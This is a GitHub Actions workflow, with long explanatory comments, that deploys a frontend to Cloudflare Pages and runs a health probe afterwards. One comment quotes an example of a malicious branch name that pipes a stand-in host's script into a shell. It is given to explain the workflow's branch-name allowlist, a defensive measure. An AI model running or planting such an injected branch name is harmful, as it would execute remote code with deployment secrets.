name: Deploy

# **No `pull_request` trigger, deliberately.** A workflow that deploys a pull request runs that
# pull request's code with the Cloudflare credentials available to it — `npm run build` executes
# `vite.config.ts` and every plugin it loads, from the branch being built. Scoping the token to
# the steps that need it narrows that; it cannot remove it, because a pull request can edit this
# file too. So branch write access would remain Cloudflare token access, and this repository
# accepts pull requests.
#
# The alternative was protected GitHub Environments with required reviewers, which keeps previews
# at the cost of a click per pull request. Previews were judged not worth that: the application
# is a static bundle whose behaviour is covered by the browser tests in CI, and a reviewer who
# wants one can dispatch this workflow by hand against any branch.
#
# What a pull request still gets is the *caching contract* check — `ci.yml` runs
# `npm run check:deploy` independently, so a `_headers` that would pin the app shell is still
# caught in review rather than after it ships.
on:
  push:
    branches: [main]
  # A maintainer can still deploy any branch by hand, which is what replaces PR previews. It
  # requires write access, so the code being run is code somebody with write access chose.
  workflow_dispatch:

concurrency:
  # Not cancel-in-progress. A cancelled deploy is a half-uploaded site, and the run that
  # cancelled it may itself be cancelled by the next one - so the last thing actually deployed
  # would be nobody's idea of the current state. Queueing costs a few minutes; the alternative
  # costs correctness.
  group: deploy-${{ github.ref }}
  cancel-in-progress: false

permissions:
  contents: read
  # For the GitHub Deployment the action records, so a hand-dispatched preview says where it went.
  deployments: write

jobs:
  deploy:
    name: Cloudflare Pages
    runs-on: ubuntu-latest
    env:
      # Read through the environment rather than interpolated straight into a `run:` block.
      # `${{ }}` substitution happens before the shell sees the script, so a branch name is
      # code at that point rather than data.
      #
      # `github.ref_name` rather than `github.head_ref || github.ref_name`: `head_ref` is set
      # only for pull requests, and there are none here any more.
      BRANCH: ${{ github.ref_name }}

      # The Cloudflare credentials are deliberately **not** here. They used to be, with a note
      # arguing that `npm ci --ignore-scripts` meant no untrusted code ran in this job — which
      # is true of *dependency* code and not of this repository's own: `npm run build` executes
      # `vite.config.ts` and every plugin it loads, from the branch being built.
      #
      # Dropping the `pull_request` trigger means that branch is now always one somebody with
      # write access chose. This stays scoped anyway, because the two facts are independent: a
      # token in the job environment is readable by every step whatever caused the run, and
      # narrowing it costs nothing.
      #
      # They sit on the two steps that need them — the preflight check and the deploy — which
      # read the same expressions, so the check still guards the values the deploy uses.

    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1

      # Git permits a great deal in a ref name. It forbids spaces, `~`, `^`, `:`, `?`, `*`,
      # `[` and `\` — and permits `;`, `&`, `|`, `$`, `(`, `)` and backticks. So
      # `main;curl evil.example|sh` is a legal branch, and this workflow puts the branch name
      # into a command that a shell will run. This workflow only runs on a push to `main` or a
      # hand dispatch, so it is not reachable by a stranger; it is still one push away from
      # anyone who can create a branch here, and "only our own contributors could exploit it"
      # is not a security property worth relying on.
      #
      # An allowlist rather than an escape: there is no branch this project needs whose name
      # is outside this set, so the safe answer is to refuse the rest rather than to be clever
      # about quoting it.
      - name: Refuse a branch name that is not a branch name
        id: branch
        run: |
          if ! printf '%s' "$BRANCH" | grep -Eq '^[A-Za-z0-9][A-Za-z0-9._/-]{0,99}$'; then
            echo "Refusing to deploy: the branch name is not in [A-Za-z0-9._/-]." >&2
            exit 1
          fi
          echo "name=$BRANCH" >> "$GITHUB_OUTPUT"

      # Fails in eleven seconds with a sentence naming the cause, rather than after a four
      # minute install-and-build with wrangler's generic "it's necessary to set a
      # CLOUDFLARE_API_TOKEN". Forks are already excluded above, so an empty value here is
      # never "as expected" - it means the organisation secret is not granted to this
      # repository, which is a settings change, not a code change.
      - name: Refuse to build without Cloudflare credentials
        env:
          # The account id is read from either store. It is not a secret — it is in the path of
          # every dashboard URL — so a variable is its more honest home, but it works as a
          # secret too, and which one an administrator reached for should not decide whether the
          # site deploys. `||` yields the first non-empty operand, and an unset secret is "".
          CLOUDFLARE_ACCOUNT_ID: ${{ secrets.CLOUDFLARE_ACCOUNT_ID || vars.CLOUDFLARE_ACCOUNT_ID }}
          CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
        run: |
          missing=
          [ -n "$CLOUDFLARE_ACCOUNT_ID" ] || missing="$missing CLOUDFLARE_ACCOUNT_ID"
          [ -n "$CLOUDFLARE_API_TOKEN" ] || missing="$missing CLOUDFLARE_API_TOKEN"
          if [ -n "$missing" ]; then
            echo "Not deploying: no value for$missing." >&2
            echo "These live on the beyonddemise organisation: CLOUDFLARE_API_TOKEN as a" >&2
            echo "secret, CLOUDFLARE_ACCOUNT_ID as either a secret or a variable. Check that" >&2
            echo "each one exists and that its repository access includes this one." >&2
            exit 1
          fi

      - name: Reject a literal token in any .npmrc
        run: node scripts/check-npmrc.mjs

      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
        with:
          node-version-file: .nvmrc
          cache: npm
          # This job installs `frontend` and nothing else - it builds the site, and the root
          # holds only Biome and the end-to-end suite, neither of which deploys anything. So
          # the cache is keyed on the lockfile actually being installed; left at the default it
          # would key on the root's and be restored for a tree this job never uses.
          cache-dependency-path: frontend/package-lock.json

      # --ignore-scripts for the same reason as in ci.yml: a transitive dependency's
      # postinstall would otherwise run with WEBAWESOME_NPM_TOKEN in its environment.
      - name: Install (no lifecycle scripts)
        run: npm ci --ignore-scripts
        working-directory: frontend
        env:
          WEBAWESOME_NPM_TOKEN: ${{ secrets.WEBAWESOME_NPM_TOKEN }}

      # The one check that has to run here as well as in CI. Everything else in `verify` gates
      # merging; this gates *deploying*, and the two are not the same event — a `_headers`
      # broken on main would otherwise ship and then be discovered by users who cannot get the
      # new version because the old service worker will not step aside.
      - name: Caching contract
        run: npm run check:deploy
        working-directory: frontend

      # The other half of the deployment contract. `_headers` decides how long the browser
      # keeps what it was given; `_routes.json` decides whether it reaches a Function at all.
      # Here as well as in ci.yml for the same reason the step above is: a `/api/*` that
      # has fallen out of `include` ships as 200 with the app shell, which review catches and
      # monitoring does not.
      - name: Forwarder routes
        run: npm run check:routes
        working-directory: frontend

      # One package since #181, so there is nothing to build first: `core` and `data` used to be
      # separate projects resolved through their emitted declarations, which is why this job
      # needed a `tsc --build` before `vite build` or failed with "Failed to resolve import".
      # They are now directories inside the same package, and Vite compiles the source.
      #
      # `npm run build` still typechecks before bundling - both passes, including the domain
      # purity one - because a deploy is the last place to discover a type error.
      - name: Build the site
        run: npm run build
        working-directory: frontend

      # Direct Upload rather than Cloudflare's Git integration, so that what is deployed is
      # what this repository's own pipeline built - same Node version, same lockfile, same
      # Web Awesome Pro token. A second build system with its own opinions is a second place
      # for "works on main" to stop being true.
      #
      # The project must already exist: `wrangler pages deploy` can create one interactively,
      # and an Actions runner is not a TTY, so it errors instead. `matter-manager-app` was
      # created once, from a machine with credentials, with
      # `cf pages projects create --name matter-manager-app --production-branch main`
      # (`npx wrangler pages project create matter-manager-app --production-branch=main` does
      # the same thing). The production branch is fixed at creation for a Direct Upload
      # project, so getting it wrong there makes every deploy a preview.
      # See docs/adr/0014-cloudflare-pages-deployment.md.
      - name: Deploy
        id: deploy
        uses: cloudflare/wrangler-action@ebbaa1584979971c8614a24965b4405ff95890e0 # v4.0.0
        with:
          # **This is what makes the Pages Functions ship.** Wrangler resolves `functions/`
          # against its own working directory, hardcoded as `join(cwd(), "functions")` - there
          # is no flag to point it elsewhere, whatever the shape of `--functions-directory`
          # suggests. Run from the repository root it would look for `./functions`, find
          # nothing, and upload the assets alone: a deployment that succeeds, passes every
          # check, and answers 200 with the app shell from /api/*.
          #
          # `frontend/` is also where the npm steps above already run, and where wrangler is a
          # devDependency - so the action finds it installed and runs no `npm i` of its own
          # against an .npmrc that carries the Web Awesome token.
          workingDirectory: frontend
          # Passed as inputs, and they have to be. This comment previously claimed the opposite
          # — that supplying them would overwrite the job environment with empty strings — and
          # had the mechanism exactly backwards. Read from the pinned action's own source at
          # ebbaa15 (dist/index.mjs):
          #
          #     CLOUDFLARE_API_TOKEN: getInput("apiToken"),
          #     ...
          #     function authenticationSetup(config) {
          #       process.env.CLOUDFLARE_API_TOKEN = config["CLOUDFLARE_API_TOKEN"]
          #       process.env.CLOUDFLARE_ACCOUNT_ID = config["CLOUDFLARE_ACCOUNT_ID"]
          #     }
          #
          # `authenticationSetup` is the first thing `main()` calls, it assigns
          # unconditionally, and `@actions/core`'s `getInput` returns `""` for an input nobody
          # supplied. So *omitting* these is what wipes the environment: the action would set
          # both variables to the empty string before wrangler ever runs, and the deploy would
          # fail reporting no credentials however carefully the secrets were configured.
          apiToken: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          accountId: ${{ secrets.CLOUDFLARE_ACCOUNT_ID || vars.CLOUDFLARE_ACCOUNT_ID }}
          gitHubToken: ${{ secrets.GITHUB_TOKEN }}
          # `--branch` is what decides production from preview: a deployment whose branch is
          # the project's production branch (main) is production, anything else is a preview
          # at <branch>.matter-manager-app.pages.dev. A push to `main` is therefore production, and
          # a hand dispatch against any other branch is a preview — which is what replaced
          # deploying pull requests automatically.
          #
          # Substituted, not left for a shell to expand. This is an action *input*, and
          # whether the action runs it through a shell at all is the action's business, not
          # ours — an earlier version passed `$BRANCH` and would have deployed to a branch
          # literally named that if it did not. Substitution is safe here precisely because
          # the step above refused anything outside [A-Za-z0-9._/-]; without that check this
          # line would be the injection the check exists to prevent.
          command: >-
            pages deploy dist
            --project-name=matter-manager-app
            --branch=${{ steps.branch.outputs.name }}

      # The one fact nothing else reveals: did a Function run?
      #
      # Deliberately weak about *what* it answered. Until the API is reachable from the edge
      # this request is a 502 - and a 502 from our own forwarder is proof that a Function ran,
      # so the check passes on it. What it refuses is `text/html`, because that is the failure
      # it exists to catch: with no Function bundled, /api/healthz falls through to the
      # single-page fallback and answers 200 with the app shell. A stricter assertion here
      # would couple deploying the site to the API being up, and would fail for the one reason
      # that is not this workflow's business.
      - name: A forwarder answered
        env:
          DEPLOYMENT_URL: ${{ steps.deploy.outputs.deployment-url }}
        run: |
          set -euo pipefail
          if [ -z "${DEPLOYMENT_URL}" ]; then
            echo "The deploy step reported no URL, so there is nothing to probe." >&2
            exit 1
          fi
          # One request per attempt, not two. An earlier version made a second identical call
          # just to read the content type, which is a second chance to be challenged,
          # rate-limited or served by a different edge node - so the status and the type it
          # compared could come from two different answers.
          #
          # Retried, because `wrangler pages deploy` returns before the deployment is serving.
          # Run 36529216882 probed 0.4 s after upload and got 404; the same URL answered
          # `200 {"status":"ok"}` minutes later. A gate that fails on a race is a gate whose
          # red means "run it again", which is the whole failure this step has already had
          # once. Six attempts over thirty seconds, and a 404 is the only status worth
          # retrying: it is what an edge says about a deployment it does not have yet.
          for attempt in $(seq 1 6); do
            read -r status type < <(curl -sS -o /tmp/probe.body -D /tmp/probe.head \
              -w '%{http_code} %{content_type}\n' -H 'Accept: */*' "${DEPLOYMENT_URL}/api/healthz")
            echo "attempt ${attempt}: GET ${DEPLOYMENT_URL}/api/healthz -> ${status} ${type}"
            [ "${status}" = "404" ] || break
            sleep 5
          done

          # **Only a 200 carrying HTML is the failure this step exists to catch.** That is what
          # the single-page fallback returns for a path it does not recognise, and it is the
          # precise shape of "no Function ran". Every other HTML response comes from somebody
          # else's page - Cloudflare's 404, its bot interstitial, a WAF block - and reading
          # those as our app shell is how this check produced two false failures before anyone
          # had broken anything. Narrowing to 200 is not a weaker assertion; it is the one the
          # symptom actually supports.
          case "${type}" in
            text/html*) ;;
            *)
              # Not HTML at all, so it came from the forwarder: the API's JSON through it, or
              # its own plain-text 502. Either proves a Function ran, which is the whole
              # question.
              echo "A Function answered (${status}); the forwarder is deployed."
              exit 0
              ;;
          esac

          if [ "${status}" != "200" ]; then
            # HTML, but not the 200 the single-page fallback returns - so it is somebody
            # else's page. Cloudflare's 404 while a deployment propagates, its bot
            # interstitial, a WAF block. None of them is evidence about our bundle, and
            # saying "a Function answered" here would be as false as calling it the app shell.
            echo "::warning::Could not tell whether a Function ran: the edge answered ${status} with HTML."
            echo "The edge served its own ${status} page rather than passing the request" >&2
            echo "through, so this says nothing either way. Check by hand:" >&2
            echo "  curl -sS -D- ${DEPLOYMENT_URL}/api/healthz" >&2
            exit 0
          fi

          # HTML, which is the symptom this step exists to catch - but not every HTML body is
          # our app shell, and the difference decides whether a deployment is broken or merely
          # unobservable.
          #
          # Cloudflare's own bot protection answers *.pages.dev with an interstitial titled
          # "Just a moment...", 403, text/html, and a `cf-mitigated` header. A GitHub runner is
          # exactly the sort of client it challenges, and this step failed the first real
          # deploy that way (run 36522759319) while the forwarder was working perfectly:
          # `https://app.matter-manager.io/api/healthz` answered 200 with the API's JSON at the
          # same moment. A check that fails at random on something the deployment does not
          # control is worse than no check, because the first response to a red run stops being
          # "what broke" and becomes "run it again".
          #
          # So a challenge is reported as inconclusive rather than as a failure. It is a real
          # loss - a genuinely unbundled deployment could hide behind one - and it is the lesser
          # loss, because the bundling is already asserted before the deploy by
          # `npm run check:functions`, which compiles functions/ with no network at all.
          if grep -qi '^cf-mitigated:' /tmp/probe.head ||
             grep -qi 'Just a moment' /tmp/probe.body; then
            # Reachable only for a 200 now, since anything else left above - a challenge served
            # with 200 rather than 403, which Cloudflare also does.
            echo "::warning::Cloudflare challenged the probe, so whether a Function ran is unknown."
            echo "Cloudflare served its bot interstitial (${status}) instead of passing the" >&2
            echo "request through, which it does to CI runners on *.pages.dev. This is not" >&2
            echo "evidence either way. Check by hand:" >&2
            echo "  curl -sS -D- ${DEPLOYMENT_URL}/api/healthz" >&2
            exit 0
          fi

          echo >&2
          echo "/api/healthz was served the app shell, so no Pages Function ran." >&2
          echo "The functions/ directory was not bundled - check that the Deploy step" >&2
          echo "still sets workingDirectory: frontend, and see" >&2
          echo "docs/superpowers/specs/2026-09-29-pages-functions-proxy-design.md." >&2
          head -c 200 /tmp/probe.body >&2
          exit 1

      - name: Say where it went
        env:
          DEPLOYMENT_URL: ${{ steps.deploy.outputs.deployment-url }}
          ALIAS_URL: ${{ steps.deploy.outputs.pages-deployment-alias-url }}
        run: |
          {
            echo "### Deployed"
            echo
            echo "- Branch: \`$BRANCH\`"
            echo "- This deployment: $DEPLOYMENT_URL"
            echo "- Branch alias: $ALIAS_URL"
          } >> "$GITHUB_STEP_SUMMARY"
